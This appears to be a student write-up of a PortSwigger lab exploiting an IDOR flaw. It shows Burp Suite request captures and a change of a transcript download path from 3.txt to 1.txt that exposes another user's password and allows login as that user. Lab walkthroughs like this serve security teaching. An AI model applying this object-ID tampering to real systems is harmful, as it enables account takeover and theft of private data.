Kindly go through the video below for the demonstration of our take on exploiting the chosen vulnerability: IDOR

DEMO VIDEO: https://drive.google.com/drive/folders/1fRn__sgbEjkxFmi94SlCWaPlWWOESOKV?usp=sharing

(Since the file is greater than 10MB, a link to the demo video is attached)

In this demo video, we will be able to see how we have implemented the IDOR vulnerability using the Portswigger lab. Initially, we are to bypass the authentication of a user but we do not have his login credentials. However, we do know that his username is Carlos. In order to extract this information, we click on the Live Chat option and start chatting. 

Simultaneoulsy, we turn on the proxy and connect to Burpsuite (Instructions on how to install Burpsuite are listed on the BurpSuite Installation file from the main menu). Once we are connected to Burpsuite, we turn on the Intercept and capture the live data from the website and monitor the traffic accordingly. 

Next, we converse a bit with the automated agent on the site and click on "View Transcript". This as well is captured on BurpSuite. The following can be seen on the Burpsuite tab before the chat is initiated:

```
GET /chat HTTP/1.1

Host: ac3c1f491e41921ac04132ce00c100ed.web-security-academy.net

Cookie: session=z4OEDOySGTju5qpD5KcmIibmTUlzBaMT

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://ac3c1f491e41921ac04132ce00c100ed.web-security-academy.net/

Upgrade-Insecure-Requests: 1

Te: trailers

Connection: close
```

Once the Live Chat is initiated, the following is captured:

```

GET /academyLabHeader HTTP/1.1

Host: ac3c1f491e41921ac04132ce00c100ed.web-security-academy.net

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: /

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Sec-WebSocket-Version: 13

Origin: https://ac3c1f491e41921ac04132ce00c100ed.web-security-academy.net

Sec-WebSocket-Key: CXXIpKR8C4joiI8aLp8w9A==

Connection: keep-alive, Upgrade

Cookie: session=z4OEDOySGTju5qpD5KcmIibmTUlzBaMT

Pragma: no-cache

Cache-Control: no-cache

Upgrade: websocket
```

On analysis, we can see that a simple GET method is used to capture data and whatever is entered in the field is simply returned. This is where our exploitation comes to light. On clicking Forward, the requests are passed and we move to the next steps. Now, to get hold of the password of the user, we need to understand that at some point, the automated agent has confirmed with the user that the password is so and so. For us to know what this is, we simply change the following:

```
From: GET /download-transcript/3.txt HTTP/1.1
```
```
To: GET /download-transcript/1.txt HTTP/1.1
```

Once these changes are made, we simply have to click on the Forward button to bypass the requests and finally reach the point where the transcript is available for download. Post downloading of the new "1.txt" file, we open it to find the "confidential" conversation between the two to find out what Carlos' password is. 

The extracted password is simply copy pasted into the login page and voila, we have now exlpoited the vulnerability without much work. 

The patchwork for this has been demonstrated in the Patchwork.md file. 
